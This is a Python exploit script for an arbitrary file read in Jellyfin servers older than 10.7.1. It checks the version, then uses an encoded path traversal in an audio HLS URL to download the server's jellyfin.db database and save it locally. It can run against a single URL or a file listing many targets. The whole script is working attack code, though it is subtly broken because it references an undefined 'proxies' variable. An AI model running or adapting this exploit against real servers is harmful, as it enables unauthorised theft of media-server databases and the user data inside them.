#!/usr/bin/env python
# -*- conding:utf-8 -*-
import requests
import argparse
import sys
import urllib3
import time
urllib3.disable_warnings()


def title():
    print("""
     _         _   _           __   _            ___                   _     ___   _   _       
  _ | |  ___  | | | |  _  _   / _| (_)  _ _     | _ \  ___   __ _   __| |   | __| (_) | |  ___ 
 | || | / -_) | | | | | || | |  _| | | | ' \    |   / / -_) / _` | / _` |   | _|  | | | | / -_)
  \__/  \___| |_| |_|  \_, | |_|   |_| |_||_|   |_|_\ \___| \__,_| \__,_|   |_|   |_| |_| \___|
                       |__/                                                                    
                       |__/                                           

                                     Author: Henry4E36
               """)

class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        target_url = self.url + "/system/info/public"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Content-Type": "application/octet-stream"
        }

        # proxies = {
        #     "http": "http://127.0.0.1:8080",
        #
        # }
        # 获取Jellyfin的版本和系统OS类型
        try:
            res = requests.get(url=target_url, headers=headers, verify=False, timeout=5)
            if res.status_code == 200 and "Version" in res.text:
                if res.json()['Version'] < "10.7.1":
                    # 该POC存在极大误差，时而灵时而不灵，就跟神经病一样，所以用了读取db文件的POC。
                    # poc_url = self.url + "/Audio/anything/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3"
                    poc_url = self.url + "/Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/"
                    # 验证任意文件读取
                    try:
                        res_poc = requests.get(url=poc_url, headers=headers, verify=False, timeout=5, proxies=proxies)
                        if res_poc.status_code == 200 and "SQLite format" in res_poc.text:
                            print(f"\033[31m[{chr(8730)}]  目标系统: {self.url} 存在任意文件读取！\033[0m")
                            print(f"[-] 正在保存DB文件:")
                            a = time.time()
                            with open(f'{a}.db', "w") as f:
                                f.write(res_poc.text)
                            f.close()
                            print(f"\033[31m[{chr(8730)}] 成功保存DB文件，信息保存在{a}.db文件中\033[0m")
                        else:
                            print(f"[\033[31mx\033[0m]  目标系统: {self.url} 不存在任意文件读取！")
                    except Exception as e:
                        print("[\033[31mX\033[0m]  读取文件时，连接错误！")
                        print("[" + "-" * 100 + "]")

                else:
                    print("[\033[31mX\033[0m]  版本过高！")
                print("[" + "-"*100 + "]")
            else:
                print(f"[\033[31mx\033[0m]  目标系统: {self.url} 无法获取系统信息！")
                print("[" + "-"*100 + "]")
        except Exception as e:
            print("[\033[31mX\033[0m]  获取系统信息时，连接错误！")
            print("[" + "-"*100 + "]")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)





if __name__ == "__main__":
    title()
    parser = ar=argparse.ArgumentParser(description='Jellyfin 任意文件读取')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 Jellyfin-read..py -u http://127.0.0.1"
            "\neg2:>>>python3 Jellyfin-read.py -f ip.txt")
    elif args.url:
        information(args).target_url()

    elif args.file:
        information(args).file_url()

